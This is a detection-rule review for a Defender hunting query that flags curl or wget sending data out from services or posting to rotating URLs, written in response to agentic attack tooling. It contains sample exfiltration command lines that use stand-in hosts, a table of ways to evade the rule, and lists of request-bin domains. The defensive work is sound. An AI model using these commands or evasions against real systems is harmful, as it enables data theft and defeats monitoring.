# REVIEW - DAC-MDE-0120 MDE: curl or wget sends data out from a service, or posts to rotating URLs

## Attribution
Clean-room behavioural rule from public sources opened on 28 Nov 2026 (IST). ThreatDefence Hunt 12 matches destination strings (webhook.site, oast., interact.sh, ngrok, trycloudflare.com) and raw public IPs; this rule matches what the process does (sends data, service ancestry, rotating URLs) and never filters on a domain or IP. No query text was copied.
- Google Threat Intelligence Group, ARTEX and Friends ('native curl to pull down dynamically generated PowerShell and batch scripts and post back command results across 491 rotating webhook.site URLs'; also AD enumeration output sent to rotating webhook.site endpoints via curl): https://cloud.google.com/blog/topics/threat-intelligence/artex-and-friends-enter-agentic-offensive-frameworks
- ThreatDefence ('curl posting to webhook.site from a server' signal; Hunt 12): https://threatdefence.com/article/artex-agentic-attack-framework-detection-hunting
- Microsoft 5 Nov 2026 post (ARTEX context): https://www.microsoft.com/en-us/security/blog/2026/11/05/threat-actors-use-agentic-ai-tooling-to-find-and-abuse-exposed-secrets/
- DeviceProcessEvents schema (FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName, AccountName): https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceprocessevents-table
- curl manual (-d/--data, --data-binary, --data-raw, --data-urlencode, --json, -F/--form, -T/--upload-file, -X/--request): https://curl.se/docs/manpage.html
- GNU Wget manual (--post-data, --post-file, --body-data, --body-file, --method; -d is --debug): https://www.gnu.org/software/wget/manual/wget.html
- ATT&CK v19.2: T1567.004 Exfiltration Over Webhook (exfiltration) https://attack.mitre.org/techniques/T1567/004/; T1071.001 Web Protocols (command and control) https://attack.mitre.org/techniques/T1071/001/.

## As-is
Gap from the ARTEX coverage report (artex-detection-report, 28 Nov 2026). ThreatDefence H12 was Partial: DAC-CS-0206 matches tunnels (ngrok, cloudflared, chisel, trycloudflare, SSH -R/-D) but not webhook/OAST callbacks. TD-P13 asked for a category approach rather than a domain blocklist.

## After
New defender rule DAC-MDE-0120. Two reasons, reported in the Reason column: service-ancestry (curl/wget sending data, or command substitution in the parent shell, under a web/app/database service) and rotating-urls (10+ distinct URLs on one host from one device in an hour, any parent). DestCategory flags request-bin/OAST-looking hosts for triage only.

## Domain-list check (IOC gate)
The alert never depends on a domain. DestCategory is computed after the decision and is not in any `where`. Removing that line leaves the same alerts. This keeps the rule behavioural as the brief required; a pure webhook.site/oast list was not built.

## Bypass research
| bypass | technique | source URL | telemetry OK | noise | decision | reason |
|---|---|---|---|---|---|---|
| PowerShell Invoke-WebRequest / Invoke-RestMethod -Method Post instead of curl | T1071.001 | https://attack.mitre.org/techniques/T1071/001/ | yes | medium | known gap | Different binary and flag set; would need a PowerShell variant with ScriptBlock logging or command-line parsing. |
| curl reading a config file (-K) that holds the data flags | T1071.001 | https://curl.se/docs/manpage.html | yes | low | known gap | Flags not on the command line. |
| Data only in the URL (GET with output in the path or subdomain), no substitution visible | T1567.004 | https://cloud.google.com/blog/topics/threat-intelligence/artex-and-friends-enter-agentic-offensive-frameworks | yes | high | partly covered | Caught by rotating-urls when 10+ distinct URLs; a single GET with encoded output is not. |
| DNS-only OAST callbacks (nslookup, dig) | T1071.004 | https://attack.mitre.org/techniques/T1071/004/ | yes | high | out of scope | Not curl/wget. |
| Renamed curl binary | T1036 | https://attack.mitre.org/techniques/T1036/ | yes | unknown | known gap | FileName match only. |
| Spread the rotation over more than an hour | T1071.001 | https://cloud.google.com/blog/topics/threat-intelligence/artex-and-friends-enter-agentic-offensive-frameworks | yes | n/a | known gap | Window is 1h. |

## FP check
Expected benign hits: apps that shell out to curl to call one webhook (alerts under service ancestry; allowlist by DeviceName + DestHost), and REST clients that post to many object paths. Normal admin downloads (no send flag) and fixed-URL monitoring posts do not alert. Volume not measured; no tenant data used.

## Unverified ideas
- Whether MDE records the full curl.exe command line when started by cmd.exe from xp_cmdshell (assumed yes).
- A Windows PowerShell web-request variant (see bypass table).
- Using DeviceNetworkEvents RemoteUrl to confirm the connection was made (not just launched).

## Tests / fixtures
Synthetic fixtures under tests/cases/DAC-MDE-0120/ (synthetic, not run). Destination hosts use example.net / example.org documentation domains, not real request-bin services.

| Fixture | Expect alert | Python mirror | Result |
|---|---|---|---|
| malicious_sqlservr_cmd_curl_posts_output | yes | alert | match |
| malicious_rotating_urls_any_parent | yes | alert | match |
| malicious_php_fpm_sh_curl_substitution | yes | alert | match |
| benign_admin_curl_download | no | no alert | match |
| benign_monitoring_post_same_url | no | no alert | match |
| near_miss_wget_debug_flag_from_w3wp_child | no | no alert | match |

CI validate: see PR checks. Not run in Advanced Hunting.

## Ponytail findings
| # | Finding | Failing input | Fix |
|---|---|---|---|
| 1 | Domain list (Hunt 12) misses any request-bin not on the list and rots as services change | curl -d @o.txt https://new-bin.example/x | Behaviour (send flags, ancestry, rotation) instead of domains |
| 2 | Combined short flags hide -d | curl -sSd @o.txt URL | `-[A-Za-z]*[dFT]` in the curl pattern |
| 3 | wget -d means debug, not data; reusing curl's pattern for wget false-alerts | wget -d -O /tmp/x URL | Separate curl and wget patterns |
| 4 | Command substitution is resolved before exec, so `$(` never appears in curl's own command line | sh -c "curl https://h/$(id)" | Check the parent shell's InitiatingProcessCommandLine |
| 5 | Direct-parent-only check misses service > shell > curl | sqlservr > cmd > curl | Grandparent checked when the parent is a shell |

## Reviewer status
- pending human approval
